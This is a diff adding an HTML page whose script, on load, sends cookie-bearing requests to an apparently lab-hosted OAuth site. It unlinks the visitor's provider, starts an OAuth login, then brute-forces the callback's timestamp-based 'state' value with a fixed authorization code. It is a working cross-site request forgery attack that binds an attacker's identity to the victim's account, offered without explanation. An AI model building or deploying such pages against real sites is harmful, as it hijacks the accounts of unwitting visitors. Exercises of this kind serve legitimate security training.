@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  </head>
+  <body>
+<script>
+    function zeroPad(num, size) {
+    num = num.toString();
+    while (num.length < size) num = "0" + num;
+    return num;
+}
+
+(async ()=>{
+
+    
+    try {
+        await fetch("http://ptl-1801d3a9-e148ea13.libcurl.so/unlink", {
+            credentials: 'include'
+        })
+    }
+    catch(e) {
+        console.log("BB"+e);
+    }
+
+    try {
+        await fetch("http://ptl-1801d3a9-e148ea13.libcurl.so/users/auth/myprovider", {
+            credentials: 'include'
+        })
+    }
+    catch(e) {
+        console.log("BB"+e);
+    }
+    for (let m=24; m<28; m++)
+    {
+        for (let s=0;s<60;s++) {
+            try {
+                await fetch("http://ptl-1801d3a9-e148ea13.libcurl.so/users/auth/myprovider/callback?code=4b9d0d3f70389a3cdd5bfecf88020485e6481d5409649e4715b31a8bcecfbaf7&state=2021080810"+zeroPad(m,2)+zeroPad(s,2), {
+                    credentials: 'include'
+                })
+            }
+            catch(e) {
+                console.log("BB"+e);
+            }
+        }
+    }
+})();
+</script>
+  </body>
+</html>
